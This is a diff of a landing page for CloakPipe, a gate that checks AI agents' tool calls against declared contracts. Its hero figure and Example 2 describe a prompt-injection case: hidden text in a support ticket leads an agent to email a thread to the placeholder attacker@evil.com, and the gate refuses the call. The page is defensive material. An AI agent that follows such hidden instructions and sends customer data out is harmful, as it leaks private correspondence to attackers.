@@ -3,153 +3,188 @@
   <div class="wrap hero-grid">
     <div>
       <div class="eyebrow reveal">Policy enforcement for AI-agent tool calls · developer preview</div>
-      <h1 class="reveal" data-d="1">Model proposes.<br>Code <span class="acc">disposes.</span></h1>
+      <h1 class="home-h1 reveal" data-d="1">Policy enforcement for teams running AI agents <span class="acc">in production</span></h1>
+      <p class="stance reveal" data-d="2">Model proposes. Code disposes. CloakPipe is the code.</p>
       <p class="lede reveal" data-d="2">
-        Policy enforcement for teams running AI agents in production. CloakPipe is a small, self-hosted gate
-        between your agent and the tools it calls: it checks every call against a declared contract with plain
-        code, blocks anything outside it, and records each decision in a log you can verify offline.
+        CloakPipe is a small, self-hosted gate between your agent and the tools it calls. It checks every
+        call against a contract you declared, using plain code with no model in the decision. Anything outside
+        the contract is refused before it reaches the tool, and the refusal goes into a hash-chained log you
+        can verify offline.
       </p>
       <div class="hero-ctas reveal" data-d="3">
         <a class="btn btn-lg btn-cta" href="/docs/quickstart"><span class="corner"></span>Get started <span class="arr">→</span></a>
-        <a class="btn btn-lg" href="/docs/mcp-gate">How the gate works <span class="arr">→</span></a>
         <a class="btn btn-lg btn-gh" href="https://github.com/rohansx/cloakpipe" aria-label="CloakPipe on GitHub"><svg class="gh-mark" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg><span>GitHub</span></a>
       </div>
-      <p class="cta-tertiary reveal" data-d="3">Running agents in production? <a href="mailto:rohan@cloakpipe.co?subject=CloakPipe%20design%20partner">Become a design partner →</a></p>
+      <p class="cta-tertiary reveal" data-d="3">Free, open-source gate (MIT). Want hosted alerts and approvals? <a href="/waitlist">Tell us you want it →</a></p>
       <div class="hero-stats reveal" data-d="4">
         <div class="hero-stat"><strong>0</strong><span>models in the allow/deny decision</span></div>
         <div class="hero-stat"><strong>3</strong><span>Declare · Enforce · Prove</span></div>
-        <div class="hero-stat"><strong>MIT</strong><span>inspectable enforcement core</span></div>
+        <div class="hero-stat"><strong>MIT</strong><span>self-hosted, free</span></div>
       </div>
     </div>
 
-    <div class="hero-chart reveal" data-d="2">
-      <div class="chart-frame release-frame">
-        <div class="chart-header"><span>Agent Release</span><span class="live">CANDIDATE</span></div>
-        <div class="release-title"><span>support-agent@184</span><small>sha256:8e7a3fb…</small></div>
-        <div class="manifest-grid">
-          <div><span>code</span><strong>8fd29ac</strong></div>
-          <div><span>prompt</span><strong>support-v31</strong></div>
-          <div><span>model</span><strong>provider/model@snapshot</strong></div>
-          <div><span>tools</span><strong>support-tools@17</strong></div>
-          <div><span>retrieval</span><strong>support-index@892</strong></div>
-          <div><span>policy</span><strong>support-prod@11</strong></div>
-        </div>
-        <div class="release-gate">
-          <span>Certification gate</span><strong class="deny">BLOCKED</strong>
-          <small>tool accuracy 0.972 · required 0.980</small>
-        </div>
-        <div class="chart-foot">
-          <div class="cf"><div class="l">Privacy</div><div class="v accent">PASS</div></div>
-          <div class="cf"><div class="l">Critical cases</div><div class="v danger">1 FAIL</div></div>
-          <div class="cf"><div class="l">Evidence</div><div class="v">SIGNED</div></div>
-        </div>
+    <figure class="hero-chart reveal" data-d="2" id="hero-deny" aria-labelledby="hero-deny-cap">
+      <div class="chart-frame term">
+        <div class="chart-header"><span>support-agent · ticket #4472</span><span class="deny-tag">DENIED</span></div>
+<pre class="term-body"><span class="tc"># hidden text in the ticket told the agent to forward the thread</span>
+<span class="tw">agent</span>  → tools/call <span class="tt">send_email</span>
+         to: <span class="tx">attacker@evil.com</span>
+
+<span class="tw">gate</span>   <span class="tx">✕ deny</span>  scope_mismatch at /to
+         recipient is not the ticket's customer
+
+<span class="tw">agent</span>  ← {"error":{"code":<span class="tx">-32001</span>,
+            "data":{"path":"/to",
+                    "reason":"scope_mismatch",
+                    "release":"sha256:8e7a3fb…",
+                    "tool":"send_email"},
+            "message":"<span class="tt">tool call refused by CloakPipe: scope_mismatch</span>"},
+          "id":7,"jsonrpc":"2.0"}
+
+<span class="tw">tool</span>   send_email never called
+<span class="tw">ledger</span> <span class="tk">✓</span> receipt written · gate_denial=scope_mismatch</pre>
+        <figcaption id="hero-deny-cap" class="term-cap">Example 2, as the gate prints it: the agent was tricked, the gate did not need to notice. The call was outside the contract, so it never ran.</figcaption>
       </div>
+    </figure>
+  </div>
+</section>
+
+<!-- ============== THREE PROBLEMS ============== -->
+<section class="section" id="problems">
+  <div class="wrap">
+    <div class="section-head reveal">
+      <div class="head-l"><div class="eyebrow">The problem</div><h2>Agents take actions.<br>Three things <span class="acc">go wrong.</span></h2></div>
+      <p>Agents in production send email, write to databases, issue refunds and call internal APIs. Observability tools show you what happened afterwards; they stop nothing. Identity tools name the agent; they do not limit what it does. The missing piece is an enforcement point on the action itself.</p>
+    </div>
+    <div class="problems reveal">
+      <div class="feature-card"><div class="ix"></div><h3>The agent is tricked</h3><p>Prompt injection arrives through tickets, web pages and documents. A filter in front of the model will never catch all of it. A check on the resulting tool call does not need to.</p></div>
+      <div class="feature-card"><div class="ix"></div><h3>The agent is over-permissioned</h3><p>It holds a long-lived credential, so one bad call can reach anything the token can. A contract limits which tools and which argument values get through the gate.</p></div>
+      <div class="feature-card"><div class="ix"></div><h3>The agent repeats itself</h3><p>A call times out, the agent retries, and the customer gets two refunds or two invoices. Side effects need a state, not a blind retry.</p></div>
     </div>
   </div>
 </section>
 
-<!-- ============== WAITLIST BAND ============== -->
+<!-- ============== DECLARE / ENFORCE / PROVE ============== -->
+<section class="section" id="how">
+  <div class="wrap">
+    <div class="section-head reveal">
+      <div class="head-l"><div class="eyebrow">How it works</div><h2>Declare. Enforce.<br><span class="acc">Prove.</span></h2><a class="learn-more" href="/docs/mcp-gate">How the gate works <span class="arr">→</span></a></div>
+      <p>The gate runs as <code class="mono">cloakpipe mcp-proxy</code> in front of one MCP server, over stdio, with no code changes in the agent. It decides with plain code, so the same call always gets the same answer.</p>
+    </div>
+    <div class="steps reveal">
+      <div class="feature-card"><div class="ix"></div><div class="step-n">01</div><h3>Declare</h3><p>A tool contract lists the tools the agent may call and the shape of every argument: types, lengths, ranges, patterns, and values that must match the current task (the ticket's customer, the tenant, the record). It is closed by default: an undeclared tool or argument is refused.</p></div>
+      <div class="feature-card"><div class="ix"></div><div class="step-n">02</div><h3>Enforce</h3><p>Every <code class="mono">tools/call</code> is checked before it is forwarded. Allowed calls go through unchanged. Refused calls get a structured JSON-RPC error the agent can read, and the tool never sees them. Risky tools wait for an approval bound to the exact arguments. Errors fail closed. <code class="mono">--gate warn</code> lets you watch before you enforce.</p></div>
+      <div class="feature-card"><div class="ix"></div><div class="step-n">03</div><h3>Prove</h3><p>Denials and side-effecting calls go into a hash-chained ledger that never stores raw argument values. <code class="mono">cloakpipe anchor</code> timestamps the chain head with an RFC 3161 authority and Sigstore Rekor, and <code class="mono">cloakpipe-verify</code> checks it offline. Per-entry signatures and an entry for every allowed call are on the roadmap.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============== FOUR EXAMPLES ============== -->
+<section class="section" id="examples">
+  <div class="wrap">
+    <div class="section-head reveal">
+      <div class="head-l"><div class="eyebrow">Four examples</div><h2>One support agent.<br><span class="acc">Four days.</span></h2></div>
+      <p>Each example says what ships today. Where the full story needs something we have not built yet, the badge says so.</p>
+    </div>
+    <div class="examples reveal">
+      <article class="ex">
+        <div class="ex-head"><span class="ex-n">01 · Normal day</span><span class="status shipping">Shipping</span></div>
+        <h3>The call fits the contract</h3>
+        <p>The agent calls <code class="mono">send_email</code> to the customer on the ticket. Every argument is inside the contract, so the gate forwards it unchanged.</p>
+        <p class="ex-note">Side-effecting calls are logged today; a log entry for every allowed call is on the roadmap.</p>
+      </article>
+      <article class="ex">
+        <div class="ex-head"><span class="ex-n">02 · Agent tricked</span><span class="status shipping">Shipping</span></div>
+        <h3>Wrong recipient, refused</h3>
+        <p>Hidden text in a ticket makes the agent call <code class="mono">send_email</code> to <code class="mono">attacker@evil.com</code>. The recipient is not the ticket's customer, so the gate refuses with <code class="mono">scope_mismatch</code> (JSON-RPC <code class="mono">-32001</code>). The email server never sees it. A call to an undeclared <code class="mono">export_customers</code> is refused as <code class="mono">undeclared_tool</code>.</p>
+        <p class="ex-note">Slack and PagerDuty alerts on denials are on the roadmap.</p>
+      </article>
+      <article class="ex">
+        <div class="ex-head"><span class="ex-n">03 · Risky but legitimate</span><span class="status partial">CLI approval today; Slack approvals on roadmap</span></div>
+        <h3>A refund needs a human</h3>
+        <p>A tool marked as needing approval is refused with <code class="mono">approval_required</code> until someone signs an approval for that exact call with <code class="mono">cloakpipe approve</code>. The agent retries and the gate forwards it. Reusing that approval for a different amount fails with <code class="mono">approval_invalid</code>.</p>
+        <p class="ex-note">Approval is per tool today; amount thresholds such as "over $100" are on the roadmap.</p>
+      </article>
+      <article class="ex">
+        <div class="ex-head"><span class="ex-n">04 · Did it happen?</span><span class="status shipping">Shipping · manual reconcile</span></div>
+        <h3>Reconcile before retry</h3>
+        <p>A <code class="mono">create_invoice</code> call is sent but the answer never comes back. The gate marks the operation <code class="mono">unknown</code> and refuses every retry with <code class="mono">reconcile_before_retry</code> until an operator records what happened with <code class="mono">cloakpipe operations reconcile</code>. A retry of a call that already succeeded gets the stored result instead of a second invoice.</p>
+        <p class="ex-note">Today the outcome turns unknown when the gate or the tool server stops mid-call. Per-call timeouts and reconciliation hooks are on the roadmap.</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ============== WHAT IT IS NOT ============== -->
+<section class="section" id="not">
+  <div class="wrap">
+    <div class="section-head reveal">
+      <div class="head-l"><div class="eyebrow">Scope</div><h2>What it is not</h2></div>
+      <p>A gate is useful because it is small and predictable. These are the things it deliberately does not try to be.</p>
+    </div>
+    <div class="problems reveal">
+      <div class="feature-card"><div class="ix"></div><h3>Not a prompt filter</h3><p>It does not read prompts or classify content. There is no model and no classifier in the decision, only the contract and the call.</p></div>
+      <div class="feature-card"><div class="ix"></div><h3>Not a governance platform</h3><p>It does not inventory your agents, issue identities or draw compliance charts. It produces the evidence those systems can use.</p></div>
+      <div class="feature-card"><div class="ix"></div><h3>Not a sandbox</h3><p>It cannot stop an action that never becomes a tool call through the gate, or a compromise of the host below it.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============== FREE GATE ============== -->
 <section class="wl-band" aria-labelledby="wl-band-title">
   <div class="wrap wl-band-inner reveal">
     <div>
-      <div class="eyebrow">Free gate · self-hosted · MIT</div>
-      <h2 id="wl-band-title">The gate is free and runs on your machines. Hosted alerts &amp; approvals (Team) come when teams ask for them.</h2>
-      <p>Start with the <a href="/docs/quickstart">quick start</a>. If you want denials in Slack and approvals in one inbox, tell us.</p>
+      <div class="eyebrow">Free, open-source gate (MIT)</div>
+      <h2 id="wl-band-title">The gate is free and runs on your machines. Enforcement will never be behind a paywall.</h2>
+      <p>Start with the <a href="/docs/quickstart">quick start</a>. Hosted alerts and approvals for teams are not built yet. If you want them, tell us.</p>
     </div>
     <a class="btn btn-lg" href="/waitlist">Tell us you want it <span class="arr">→</span></a>
-  </div>
-</section>
-
-<!-- ============== FOUR PILLARS ============== -->
-<section class="stat-strip">
-  <div class="wrap"><div class="stat-strip-inner">
-    <div class="stat-cell"><div class="l">01 · Evaluate</div><div class="v">Measure</div><div class="sub">Import JUnit, Braintrust, and Langfuse results against the exact release hash.</div></div>
-    <div class="stat-cell"><div class="l">02 · Certify</div><div class="v">Decide</div><div class="sub">A deterministic policy decision, signed and bound to the manifest hash.</div></div>
-    <div class="stat-cell"><div class="l">03 · Enforce</div><div class="v">Control</div><div class="sub">Uncertified or revoked releases lose production authority at runtime.</div></div>
-    <div class="stat-cell"><div class="l">04 · Prove</div><div class="v">Verify</div><div class="sub">Signed ledger and certifications that verify offline, without the console.</div></div>
-  </div></div>
-</section>
-
-<!-- ============== PROBLEM ============== -->
-<section class="section">
-  <div class="wrap">
-    <div class="section-head reveal">
-      <div class="head-l"><div class="eyebrow">The production problem</div><h2>Your API can be healthy<br>while your agent is <span class="acc">wrong.</span></h2></div>
-      <p>Agent behavior changes when a prompt, model snapshot, tool schema, MCP server, retrieval index, permission, or policy changes. Conventional monitoring sees successful HTTP calls. CloakPipe tracks the complete behavior-affecting release and connects pre-production assurance to runtime authority.</p>
-    </div>
-    <div class="feature-grid reveal">
-      <div class="feature-card"><div class="ix"></div><h3>Configuration drift</h3><p>The production agent no longer matches the configuration that passed evaluation.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>Silent regression</h3><p>The model still responds, but tool choice, schema adherence, task completion, latency, or cost degrades.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>Unbounded authority</h3><p>A prompt injection or changed tool grants the model more authority than its certified release received.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>Unverifiable logs</h3><p>A mutable dashboard cannot independently prove which configuration ran or why an action was allowed.</p></div>
-    </div>
-  </div>
-</section>
-
-<!-- ============== CONTROL LOOP ============== -->
-<section class="section" id="platform">
-  <div class="wrap">
-    <div class="section-head reveal">
-      <div class="head-l"><div class="eyebrow">The control loop</div><h2>From change<br>to <span class="acc">verified decision.</span></h2><a class="learn-more" href="/docs">Read the docs <span class="arr">→</span></a></div>
-      <p>CloakPipe does not replace your evaluation platform, gateway, telemetry, or CI system. It binds their evidence to one Agent Release, applies a deterministic decision, enforces it, and records the result. Every step below is in the open-source core or the cloud today.</p>
-    </div>
-    <div class="surfaces reveal">
-      <div class="surface proxy"><div class="ix"></div><div class="num">01 · EVALUATE</div><div class="name">Release assurance</div><div class="tagline">Test the exact agent configuration, not an isolated prompt or model.</div><ul class="points"><li><code class="mono">cloakpipe eval import</code> reads JUnit XML, Braintrust experiments, and Langfuse dataset runs</li><li>Fail closed: an unscored case is an error, never a pass</li><li><code class="mono">release diff</code> maps each changed component to the suites it requires</li></ul></div>
-      <div class="surface vault"><div class="ix"></div><div class="num">02 · CERTIFY</div><div class="name">Signed certification</div><div class="tagline">Turn results into a deterministic, reproducible release decision.</div><ul class="points"><li>Rules for critical failures, pass-rate regression against a baseline, coverage, and metrics</li><li>Ed25519-signed DSSE certification bound to the manifest hash</li><li>Offline <code class="mono">verify-cert</code>, revocation statements, and a GitHub Action</li></ul></div>
-      <div class="surface policy"><div class="ix"></div><div class="num">03 · ENFORCE</div><div class="name">Runtime control</div><div class="tagline">Only certified releases receive production authority.</div><ul class="points"><li>Cedar sees the release; revoked releases are blocked and uncertified ones stay pseudonymized</li><li>Production promotion requires a valid certification or a recorded break-glass reason</li><li>Sentinels revoke on live error, block, or deny rates; the MCP gate allows only declared tools</li></ul></div>
-      <div class="surface audit"><div class="ix"></div><div class="num">04 · PROVE</div><div class="name">Portable evidence</div><div class="tagline">Verify the basis and outcome of a decision outside the dashboard.</div><ul class="points"><li>Hash-chained, Ed25519-signed ledger records bound to the release hash</li><li>PII types, policy decisions, and tool hops; never raw values</li><li>Offline verifier for ledger bundles and certifications</li></ul></div>
-    </div>
-  </div>
-</section>
-
-<!-- ============== OPEN CORE ============== -->
-<section class="section" id="open-core">
-  <div class="wrap">
-    <div class="section-head reveal">
-      <div class="head-l"><div class="eyebrow">Open core</div><h2>Inspect enforcement.<br>Verify <span class="acc">proof.</span></h2><a class="learn-more" href="https://github.com/rohansx/cloakpipe">Browse the repository <span class="arr">→</span></a></div>
-      <p>The components customers must trust stay open: the Rust proxy, privacy transformations, policy runtime, release identity, evidence formats, ledger, verifier, SDKs, and adapters. CloakPipe Cloud provides managed orchestration and fleet operations.</p>
-    </div>
-    <div class="pseudo reveal ownership-table">
-      <div class="pseudo-row head"><div class="pseudo-cell">Open-source core</div><div class="pseudo-cell">Private managed cloud</div><div class="pseudo-cell">Boundary</div></div>
-      <div class="pseudo-row"><div class="pseudo-cell good"><span class="pv">Proxy, privacy, Cedar runtime, MCP gate</span></div><div class="pseudo-cell"><span class="pv">Scoped keys and per-environment release pointers</span></div><div class="pseudo-cell">Enforcement is inspectable; operations are managed.</div></div>
-      <div class="pseudo-row"><div class="pseudo-cell good"><span class="pv">Release schema, hashing, diff, CLI</span></div><div class="pseudo-cell"><span class="pv">Release registry, baselines, Releases page</span></div><div class="pseudo-cell">Identity is portable; collaboration is hosted.</div></div>
-      <div class="pseudo-row"><div class="pseudo-cell good"><span class="pv">Ledger, anchoring, certifications, audit packs, verifiers</span></div><div class="pseudo-cell"><span class="pv">Production sentinels; per-release audit pack download</span></div><div class="pseudo-cell">Evidence verifies without trusting CloakPipe Cloud.</div></div>
-      <div class="pseudo-row"><div class="pseudo-cell good"><span class="pv">EvaluationRun format and importers</span></div><div class="pseudo-cell"><span class="pv">Evaluation upload from CI and the dashboard</span></div><div class="pseudo-cell">Existing tools integrate; orchestration funds the service.</div></div>
-    </div>
-  </div>
-</section>
-
-<!-- ============== STATUS ============== -->
-<section class="section">
-  <div class="wrap">
-    <div class="section-head reveal">
-      <div class="head-l"><div class="eyebrow">Product status</div><h2>Built foundation.<br><span class="acc">Focused roadmap.</span></h2></div>
-      <p>We label product state explicitly. The developer preview now runs the full loop: release identity, imported evaluations, signed certification, runtime enforcement, and offline verification. <code class="mono">make demo</code> runs all of it locally. External anchoring and release audit packs are on <code class="mono">main</code>.</p>
-    </div>
-    <div class="feature-grid reveal">
-      <div class="feature-card"><div class="ix"></div><h3>Available now</h3><p>Rust PII-masking proxy, streaming rehydration, PII pseudonymization, vault, signed ledger, and offline verifier. Agent Release manifests and registry, eval importers, signed certification with revocation, runtime release enforcement, scoped keys, production sentinels, the MCP tool gate, and the dashboard. External anchoring to RFC 3161 timestamp authorities and Sigstore Rekor, signed per-release audit packs verified offline, evaluation upload from CI and the dashboard, and an India DPDP policy pack.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>Building next</h3><p>Importing Langfuse experiments, per-tenant Cedar policies from the dashboard, Rekor v2 and incremental multi-batch sealing, and certificate revocation checks. An RBI conduct pack is planned.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>Design-partner phase</h3><p>Drift detection, approval workflows, canary hooks, incident timelines, SSO, and regional deployment.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>Not claimed</h3><p>CloakPipe is not currently SOC 2 certified and does not yet offer a HIPAA BAA, production SAML or SCIM, managed KMS, automatic key rotation, or autonomous rollback.</p></div>
-    </div>
   </div>
 </section>
 
 <!-- ============== CLOSER ============== -->
 <section class="closer">
   <div class="wrap">
-    <h2 class="reveal">Certify the release.<br><span class="acc">Control the runtime.</span><br>Verify the evidence.</h2>
-    <p class="reveal" data-d="1">We are working with design partners operating real AI agents in production. Bring one agent, one critical workflow, and the changes you need to control.</p>
+    <h2 class="reveal">Model proposes.<br><span class="acc">Code disposes.</span></h2>
+    <p class="reveal" data-d="1">Put the gate in front of one MCP server, declare what the agent may do, and watch what it refuses.</p>
     <div class="ctas reveal" data-d="2">
       <a class="btn btn-lg btn-cta" href="/docs/quickstart"><span class="corner"></span>Get started <span class="arr">→</span></a>
-      <a class="btn btn-lg" href="/docs">Read the docs <span class="arr">→</span></a>
       <a class="btn btn-lg btn-gh" href="https://github.com/rohansx/cloakpipe" aria-label="CloakPipe on GitHub"><svg class="gh-mark" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg><span>GitHub</span></a>
+      <a class="btn btn-lg" href="/waitlist">Hosted alerts: tell us <span class="arr">→</span></a>
     </div>
-    <p class="cta-tertiary reveal" data-d="2"><a href="mailto:rohan@cloakpipe.co?subject=CloakPipe%20design%20partner">Become a design partner →</a></p>
+    <p class="cta-tertiary reveal" data-d="2"><a href="mailto:rohan@cloakpipe.co?subject=CloakPipe%20design%20partner">Running agents in production? Become a design partner →</a></p>
   </div>
 </section>
 
 <style>
+  .hero h1.home-h1 { font-size: clamp(34px, 4.3vw, 58px); line-height: 1.05; margin-bottom: 18px; }
+  .hero .stance { font: 500 clamp(17px, 1.6vw, 21px)/1.35 var(--mono); color: var(--accent); margin-bottom: 18px; letter-spacing: -0.01em; }
+  .hero-grid > * { min-width: 0; }
+  #hero-deny { margin: 0; min-height: 0; }
+  .term { height: auto; padding: 0; display: flex; flex-direction: column; }
+  .term .chart-header { padding: 16px 20px; margin: 0; border-bottom: 1px solid var(--line); }
+  .deny-tag { font: 600 10px var(--mono); letter-spacing: 0.12em; padding: 2px 8px; color: var(--danger); border: 1px solid currentColor; }
+  .term-body { margin: 0; padding: 20px; font: 400 12px/1.6 var(--mono); color: var(--text-2); white-space: pre; overflow-x: auto; background: var(--bg); }
+  .term-body .tc { color: var(--text-3); }
+  .term-body .tw { color: var(--text); font-weight: 600; }
+  .term-body .tt { color: var(--accent-2); }
+  .term-body .tx { color: var(--danger); font-weight: 600; }
+  .term-body .tk { color: var(--accent); font-weight: 600; }
+  .term-cap { padding: 14px 20px; font-size: 12.5px; line-height: 1.5; color: var(--text-3); border-top: 1px solid var(--line); }
+  .problems, .steps { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+  .step-n { font: 500 10.5px var(--mono); letter-spacing: 0.12em; color: var(--text-3); margin-bottom: 14px; }
+  .steps .feature-card h3 { font-size: 22px; }
+  .examples { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .ex { border: 1px solid var(--line); background: var(--surface); padding: 24px; display: flex; flex-direction: column; gap: 10px; }
+  .ex-head { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; flex-wrap: wrap; }
+  .ex-n { font: 500 10.5px var(--mono); letter-spacing: 0.12em; text-transform: uppercase; color: var(--text-3); }
+  .ex h3 { font: 600 18px var(--sans); letter-spacing: -0.012em; }
+  .ex p { font-size: 13.5px; color: var(--text-2); line-height: 1.55; }
+  .ex p.ex-note { margin-top: auto; padding-top: 10px; border-top: 1px solid var(--line); font-size: 12.5px; color: var(--text-3); }
+  .ex code, .feature-card code { font-size: 0.92em; overflow-wrap: anywhere; }
+  .status { font: 600 9.5px/1.5 var(--mono); letter-spacing: 0.08em; text-transform: uppercase; padding: 2px 7px; border: 1px solid currentColor; }
+  .status.shipping { color: var(--accent); }
+  .status.partial { color: var(--warn); }
   .wl-band { border-bottom: 1px solid var(--line); background: var(--surface); }
   .wl-band-inner { display: flex; align-items: center; justify-content: space-between; gap: 32px; padding-top: 36px; padding-bottom: 36px; }
   .wl-band .eyebrow { margin-bottom: 12px; }
@@ -157,31 +192,10 @@
   .wl-band p { font-size: 14px; color: var(--text-2); }
   .wl-band p a { color: var(--accent); border-bottom: 1px solid var(--accent); }
   .wl-band .btn { flex: none; }
-  @media (max-width: 760px) { .wl-band-inner { flex-direction: column; align-items: flex-start; } }
-  .release-frame { padding-bottom: 0; }
-  .release-title { padding: 28px; border-bottom: 1px solid var(--line); display: flex; justify-content: space-between; gap: 20px; align-items: baseline; }
-  .release-title span { font: 500 21px var(--mono); color: var(--text); }
-  .release-title small { font: 400 11px var(--mono); color: var(--text-3); }
-  .manifest-grid { display: grid; grid-template-columns: 1fr 1fr; }
-  .manifest-grid div { padding: 15px 20px; border-right: 1px solid var(--line); border-bottom: 1px solid var(--line); min-width: 0; }
-  .manifest-grid div:nth-child(even) { border-right: 0; }
-  .manifest-grid span, .release-gate span, .release-gate small { display: block; font: 400 10px var(--mono); color: var(--text-3); text-transform: uppercase; letter-spacing: .08em; }
-  .manifest-grid strong { display: block; margin-top: 6px; font: 500 12px var(--mono); color: var(--text-2); overflow-wrap: anywhere; }
-  .release-gate { padding: 20px 28px; border-bottom: 1px solid var(--line); }
-  .release-gate strong { display: block; margin: 8px 0 5px; font: 600 24px var(--mono); }
-  .release-gate small { text-transform: none; letter-spacing: 0; }
-  .ownership-table .pseudo-row { grid-template-columns: 1.15fr 1.15fr 1.7fr; }
-  #platform .surface { grid-column: span 3; grid-row: auto; min-height: 330px; border-right: 1px solid var(--line); border-bottom: 1px solid var(--line); }
-  #platform .surface:nth-child(even) { border-right: 0; }
-  #platform .surface:nth-child(n+3) { border-bottom: 0; }
-  #platform .surface.proxy .name { font-size: 28px; }
-  @media (max-width: 720px) {
-    .release-title { display: block; }
-    .release-title small { display: block; margin-top: 8px; }
-    .manifest-grid { grid-template-columns: 1fr; }
-    .manifest-grid div { border-right: 0; }
-    .ownership-table .pseudo-row { grid-template-columns: 1fr; }
-    #platform .surface { grid-column: auto; border-right: 0; border-bottom: 1px solid var(--line); }
-    #platform .surface:last-child { border-bottom: 0; }
+  @media (max-width: 1100px) { .problems, .steps { grid-template-columns: 1fr; } }
+  @media (max-width: 760px) {
+    .wl-band-inner { flex-direction: column; align-items: flex-start; }
+    .examples { grid-template-columns: 1fr; }
+    .term-body { font-size: 11px; padding: 16px; }
   }
 </style>
